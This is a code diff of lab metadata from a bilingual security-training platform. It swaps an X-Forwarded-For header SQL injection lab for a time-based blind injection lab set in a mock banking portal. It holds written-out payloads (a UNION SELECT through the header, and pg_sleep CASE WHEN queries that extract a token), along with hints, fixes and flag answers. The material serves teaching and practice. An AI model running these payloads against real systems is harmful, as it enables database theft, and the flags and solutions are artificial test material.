@@ -1,165 +1,132 @@
-// src/modules/practice-labs/sql-injection/labs/lab5/lab5.metadata.ts
 import type { LabMetadata } from '../../../types/lab-metadata.type';
 
 export const lab5Metadata: LabMetadata = {
-  slug: 'sqli-http-header',
-  title: 'SQL Injection: HTTP Header Injection (X-Forwarded-For)',
-  ar_title: 'حقن SQL: الحقن عبر HTTP Header',
+  slug: 'sqli-time-based',
+  title: 'SQL Injection: Time-Based Blind',
+  ar_title: 'حقن SQL: الأعمى القائم على الوقت',
   description:
-    "TrackPro analytics logs every page visit using the visitor's IP from X-Forwarded-For — injected directly into a raw SQL query. Most scanners never check headers.",
+    'No errors. No content changes. Only timing. Use pg_sleep() to extract data when there is zero visual feedback from the application.',
   ar_description:
-    'منصة TrackPro تسجّل كل زيارة باستخدام IP الزائر من X-Forwarded-For header — يُحقن مباشرة في raw SQL query. معظم الـ scanners لا تفحص الـ headers.',
+    'لا أخطاء. لا تغييرات في المحتوى. فقط التوقيت. استخدم pg_sleep() لاستخراج البيانات عندما لا يوجد أي تغذية راجعة بصرية من التطبيق.',
   difficulty: 'ADVANCED',
   category: 'WEB_SECURITY',
-  skills: [
-    'SQL Injection',
-    'HTTP Header Injection',
-    'X-Forwarded-For',
-    'UNION Attack',
-    'Out-of-Band Recon',
-  ],
-  xpReward: 400,
-  pointsReward: 200,
-  duration: 45,
+  skills: ['Time-Based Blind SQLi', 'pg_sleep', 'Timing Oracle', 'Conditional Delays'],
+  xpReward: 300,
+  pointsReward: 150,
+  duration: 60,
   executionMode: 'SHARED_BACKEND',
   isPublished: true,
+  environmentType: 'BANKING_DASHBOARD',
+  canonicalConceptId: 'sqli-blind',
 
-  // ─── للمتدرب ────────────────────────────────────────────────────
-  goal: 'Inject a UNION payload into the X-Forwarded-For header to extract a hidden admin secret from the database.',
-  ar_goal:
-    'احقن payload UNION في X-Forwarded-For header لاستخراج سر مخفي للمدير من قاعدة البيانات.',
+  goal: 'Extract the admin secret token from the database using only timing delays — no errors, no content leaks.',
+  ar_goal: 'استخرج رمز الأدمن السري من قاعدة البيانات باستخدام تأخيرات التوقيت فقط — لا أخطاء، لا تسريبات محتوى.',
+
+  missionBrief: {
+    codename: 'SILENT CLOCK',
+    classification: 'TOP_SECRET',
+    objective: 'A banking portal account lookup returns identical 200 responses for found/not-found — no data, no errors. But the SQL query is vulnerable. Use conditional pg_sleep() to ask yes/no questions via response time.',
+    ar_objective: 'بوابة بنكية لبحث الحسابات تُعيد استجابات 200 متطابقة للموجود/غير الموجود — لا بيانات، لا أخطاء. لكن استعلام SQL ضعيف. استخدم pg_sleep() الشرطي لطرح أسئلة نعم/لا عبر وقت الاستجابة.',
+    background: 'Time-based injection is the last resort when nothing else leaks. A delay of 3+ seconds = TRUE. Instant response = FALSE.',
+    successCriteria: [
+      'Confirm time-based injection using IF/CASE + pg_sleep(3)',
+      'Enumerate the token length',
+      'Extract each character via timing oracle',
+      'Reconstruct the full token and get the flag',
+    ],
+    warningNote: 'Real-world time-based attacks take hours. This lab simulates instantaneous timing for educational purposes.',
+  },
+
+  labInfo: {
+    vulnType: 'Time-Based Blind SQL Injection',
+    ar_vulnType: 'حقن SQL الأعمى القائم على الوقت',
+    cweId: 'CWE-89',
+    cvssScore: 7.5,
+    description: 'When no data or error is reflected, attackers use conditional time delays. If the database sleeps, the condition is true. The response time becomes the data channel.',
+    ar_description: 'عندما لا تنعكس بيانات أو أخطاء، يستخدم المهاجمون تأخيرات زمنية مشروطة. إذا نامت قاعدة البيانات، الشرط صحيح. يصبح وقت الاستجابة قناة البيانات.',
+    whatYouLearn: [
+      'How to use CASE WHEN + pg_sleep() for conditional delays',
+      'How to enumerate data length via timing',
+      'How to extract characters through a timing oracle',
+      'Why response time normalization matters in real attacks',
+    ],
+    techStack: ['Node.js', 'PostgreSQL', 'pg_sleep'],
+  },
 
   briefing: {
-    en: `TrackPro is an analytics SaaS used by hundreds of websites to track visitor behavior.
-Every page visit you make is logged with your IP address, action type, and timestamp.
-The POST /log-visit endpoint is completely public — no auth required.
-You've tested every input field. Nothing injectable. The developers did their homework... on the body.
-But HTTP requests have more than just a body.
-There's a header that load balancers use to pass the real client IP.
-The developer called it "server-controlled". 
-They were wrong.`,
-    ar: `TrackPro هي خدمة تحليلات SaaS تستخدمها مئات المواقع لتتبع سلوك الزوار.
-كل زيارة تقوم بها تُسجَّل بعنوان IP الخاص بك ونوع الإجراء والطابع الزمني.
-نقطة POST /log-visit عامة تماماً — لا تحتاج مصادقة.
-اختبرت كل حقل إدخال. لا شيء قابل للحقن. المطورون أدّوا واجبهم... في الـ body.
-لكن طلبات HTTP تحتوي على أكثر من مجرد body.
-هناك header تستخدمه موازنات التحميل لتمرير IP العميل الحقيقي.
-المطور أسماه "خاضع لسيطرة الخادم".
-كان مخطئاً.`,
+    en: `SecureBank's account lookup API returns exactly the same response whether the account exists or not.\nNo errors. No content differences.\nYou have no oracle... or do you?\nEvery database query takes time. Make it sleep when the condition is true.\nYour stopwatch is your only tool.`,
+    ar: `واجهة برمجة البحث عن الحسابات في SecureBank تُعيد نفس الاستجابة تماماً سواء كان الحساب موجوداً أم لا.\nلا أخطاء. لا اختلافات في المحتوى.\nليس لديك oracle... أم لديك؟\nكل استعلام قاعدة بيانات يستغرق وقتاً. اجعلها تنام عندما يكون الشرط صحيحاً.\nساعتك الإيقافية هي أداتك الوحيدة.`,
   },
 
   stepsOverview: {
     en: [
-      'Call POST /log-visit normally — understand the response structure and what gets logged',
-      'Identify which HTTP header carries the IP address and confirm it is reflected in the response',
-      'Test the header for injection — confirm the IP value is used in a raw SQL query',
-      'Determine the column count and structure of the log query to prepare your UNION payload',
-      'Inject the full UNION payload via the header to extract the hidden admin secret',
+      'Confirm — account=1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- (3s delay = confirmed)',
+      'Length — CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens))=N THEN pg_sleep(3)...',
+      'Extract — CASE WHEN ASCII(SUBSTRING(...,POS,1))=N THEN pg_sleep(3) ELSE pg_sleep(0) END--',
     ],
     ar: [
-      'استدعِ POST /log-visit بشكل طبيعي — افهم بنية الاستجابة وما يُسجَّل',
-      'حدد أي HTTP header يحمل عنوان IP وأكّد أنه ينعكس في الاستجابة',
-      'اختبر الـ header للحقن — أكّد أن قيمة IP تُستخدم في raw SQL query',
-      'حدد عدد الأعمدة وبنية استعلام السجل لتحضير payload الـ UNION',
-      'احقن payload UNION الكامل عبر الـ header لاستخراج السر المخفي للمدير',
+      'تأكيد — account=1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- (تأخير 3 ثوانٍ = تأكيد)',
+      'الطول — CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens))=N THEN pg_sleep(3)...',
+      'استخراج — CASE WHEN ASCII(SUBSTRING(...,POS,1))=N THEN pg_sleep(3) ELSE pg_sleep(0) END--',
     ],
   },
 
-  // ─── للأدمن فقط ─────────────────────────────────────────────────
   solution: {
-    context:
-      'TrackPro POST /log-visit reads the client IP from X-Forwarded-For header (standard in cloud environments behind load balancers) and injects it directly into a raw SQL query to fetch visit history. ' +
-      "The developer trusted headers as 'server-controlled' — a critical misconception. X-Forwarded-For is freely writable by any HTTP client.",
-    vulnerableCode:
-      "const ip = req.headers['x-forwarded-for']; // attacker-controlled!\n" +
-      'const query = `SELECT action AS ip, type, createdAt FROM "LabGenericLog"\n' +
-      "  WHERE userId='...' AND labId='...' AND action = '${ip}'`;",
-    exploitation:
-      "Set header: X-Forwarded-For: 1.1.1.1' UNION SELECT body, title, author FROM \"LabGenericContent\" WHERE title='admin_secret'--\n" +
-      "The flag appears in the 'ip' field of the returned visit log row.",
+    context: 'Account lookup: SELECT * FROM accounts WHERE account_id = $input',
+    vulnerableCode: "SELECT * FROM accounts WHERE account_id = '$input'",
+    exploitation: "1; SELECT CASE WHEN (SELECT secret_token FROM admin_tokens LIMIT 1)='FLAG{...}' THEN pg_sleep(3) ELSE pg_sleep(0) END--",
     steps: {
       en: [
-        "POST /log-visit with X-Forwarded-For: 1.2.3.4 → response includes visits where ip = '1.2.3.4'. Header value is directly reflected.",
-        "POST /log-visit with X-Forwarded-For: 1.2.3.4' → if visits returns [] (query broke silently), the header is injected into raw SQL confirmed.",
-        'Count columns: the response returns 3 fields: ip, type, createdAt. UNION must return exactly 3 columns.',
-        "Test UNION: X-Forwarded-For: 1.1.1.1' UNION SELECT 'test','col2','col3'-- → 'test' appears in ip field. Column types confirmed.",
-        "Final payload: X-Forwarded-For: 1.1.1.1' UNION SELECT body, title, author FROM \"LabGenericContent\" WHERE title='admin_secret'-- → flag appears in ip field of response",
+        '1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- → ~3s delay = confirmed',
+        "1; SELECT CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens LIMIT 1))=32 THEN pg_sleep(3) ELSE pg_sleep(0) END--",
+        "Extract each char: ASCII(SUBSTRING((SELECT secret_token FROM admin_tokens LIMIT 1),POS,1))=N → 3s = match",
       ],
       ar: [
-        "أرسل POST /log-visit مع X-Forwarded-For: 1.2.3.4 → تتضمن الاستجابة زيارات حيث ip = '1.2.3.4'. قيمة الـ header تنعكس مباشرة.",
-        "أرسل POST /log-visit مع X-Forwarded-For: 1.2.3.4' → إن أرجعت الزيارات [] (الاستعلام انكسر بصمت)، الـ header مُحقَن في raw SQL مؤكَّد.",
-        'احسب الأعمدة: الاستجابة تُرجع 3 حقول: ip, type, createdAt. UNION يجب أن يُرجع 3 أعمدة بالضبط.',
-        "اختبر UNION: X-Forwarded-For: 1.1.1.1' UNION SELECT 'test','col2','col3'-- → تظهر 'test' في حقل ip. أنواع الأعمدة مؤكَّدة.",
-        "الـ payload النهائي: X-Forwarded-For: 1.1.1.1' UNION SELECT body, title, author FROM \"LabGenericContent\" WHERE title='admin_secret'-- → يظهر العلم في حقل ip في الاستجابة",
+        '1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- → تأخير ~3 ثوانٍ = تأكيد',
+        "1; SELECT CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens LIMIT 1))=32 THEN pg_sleep(3) ELSE pg_sleep(0) END--",
+        "استخرج كل حرف: ASCII(SUBSTRING((SELECT secret_token...),POS,1))=N → 3 ثوانٍ = تطابق",
       ],
     },
     fix: [
-      'Never trust X-Forwarded-For for security-sensitive operations — it is client-controlled',
-      'Use req.socket.remoteAddress for the real server-side IP when behind a trusted reverse proxy',
-      'Parameterize all queries including those using header-derived values',
-      'Whitelist IP address format before using in any query: validate against /^[0-9.]+$/',
+      'Parameterized queries: WHERE account_id = $1',
+      'Cast input to integer',
+      'Block pg_sleep and similar functions via WAF',
+      'Implement query timeouts',
     ],
   },
 
   postSolve: {
     explanation: {
-      en: 'HTTP Header SQL Injection exploits the assumption that headers are server-controlled and therefore trusted. X-Forwarded-For is a standard header that any HTTP client can freely set to any value. When its value is concatenated directly into a SQL query, it becomes a full injection vector invisible to most body-focused security scanners and WAF rules.',
-      ar: 'يستغل حقن SQL عبر HTTP Header الافتراض بأن الـ headers خاضعة لسيطرة الخادم وبالتالي موثوقة. X-Forwarded-For هو header قياسي يمكن لأي HTTP client ضبطه بحرية لأي قيمة. عندما تُدمج قيمته مباشرة في استعلام SQL، يصبح متجه حقن كامل غير مرئي لمعظم أدوات الفحص الأمني المركّزة على الـ body وقواعد WAF.',
+      en: 'Time-based SQLi uses conditional delays as a binary communication channel. 3-second delay = true, instant = false. Combined with ASCII() and SUBSTRING(), every character of any value can be extracted.',
+      ar: 'يستخدم حقن SQL القائم على الوقت التأخيرات الشرطية كقناة اتصال ثنائية. تأخير 3 ثوانٍ = صحيح، فوري = خاطئ. مع ASCII() و SUBSTRING()، يمكن استخراج كل حرف من أي قيمة.',
     },
     impact: {
-      en: 'Silent, hard-to-detect data exfiltration. Because the injection point is in a request header rather than a body parameter, it bypasses most input validation, logging, and WAF rules focused on request bodies. Often missed in penetration tests and bug bounty assessments.',
-      ar: 'استخراج بيانات صامت يصعب اكتشافه. لأن نقطة الحقن في header الطلب بدلاً من معامل الـ body، فإنه يتجاوز معظم التحقق من المدخلات والتسجيل وقواعد WAF المركّزة على أجسام الطلبات. غالباً ما يُفوَّت في اختبارات الاختراق وتقييمات مكافآت الأخطاء.',
+      en: 'Full database extraction with zero error or content leakage. The only observable side-effect is latency.',
+      ar: 'استخراج كامل لقاعدة البيانات مع صفر تسريب للأخطاء أو المحتوى. التأثير الجانبي الوحيد الملاحظ هو الكمون.',
     },
-    fix: [
-      'Treat ALL request data as untrusted: body, query params, headers, cookies',
-      'Use parameterized queries universally — no exceptions based on data source',
-      'Extend WAF rules and security scanners to inspect header values for SQLi patterns',
-      'Log and monitor unusual header values in production environments',
-    ],
+    fix: ['Parameterized queries', 'Integer casting', 'DB function whitelisting', 'Query timeout policies'],
   },
 
   hints: [
     {
       order: 1,
-      xpCost: 10,
-      content:
-        "Try POST /log-visit with X-Forwarded-For: 1.2.3.4 — observe the response. The 'ip' in returned visits equals your header value exactly. The header is reflected in the query.",
+      xpCost: 20,
+      content: "Confirm time-based injection using a conditional sleep:\n  account=1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END--\nIf the response takes ~3 seconds, injection is confirmed. Compare with:\n  account=1; SELECT CASE WHEN 1=2 THEN pg_sleep(3) ELSE pg_sleep(0) END-- (instant)",
     },
     {
       order: 2,
-      xpCost: 20,
-      content:
-        "Add a single quote to the header: X-Forwarded-For: 1.2.3.4' — if visits returns empty (query broke silently), the header value is injected raw into SQL.",
+      xpCost: 35,
+      content: "Find the token length:\n  1; SELECT CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens LIMIT 1))=32 THEN pg_sleep(3) ELSE pg_sleep(0) END--\nTry different values (16, 24, 32, 40...) until you get the 3-second delay.",
     },
     {
       order: 3,
-      xpCost: 40,
-      content:
-        "The response returns 3 columns: ip, type, createdAt. Your UNION must return 3 columns too. Target table: LabGenericContent, filter by title='admin_secret'. The flag will appear in the 'ip' field.",
+      xpCost: 50,
+      content: "Extract characters via timing:\n  1; SELECT CASE WHEN ASCII(SUBSTRING((SELECT secret_token FROM admin_tokens LIMIT 1),1,1))=70 THEN pg_sleep(3) ELSE pg_sleep(0) END--\nASCII 70='F'. Repeat for each position. 3s = match, instant = try next value.",
     },
   ],
 
-  flagAnswer: 'FLAG{HTTP_HEADER_SQLI_XFF}',
+  flagAnswer: 'FLAG{SQLI_TIME_BASED_SUCCESS}',
   initialState: {
-    contents: [
-      {
-        title: 'page_meta',
-        body: 'Homepage — /index',
-        isPublic: true,
-        author: 'system',
-      },
-      {
-        title: 'page_meta',
-        body: 'Dashboard — /dashboard',
-        isPublic: true,
-        author: 'system',
-      },
-      {
-        title: 'admin_secret',
-        body: 'FLAG{HTTP_HEADER_SQLI_XFF}',
-        isPublic: false,
-        author: 'admin',
-      },
-    ],
+    admin_tokens: [{ id: 1, secret_token: 'FLAG{SQLI_TIME_BASED_SUCCESS}' }],
   },
 };
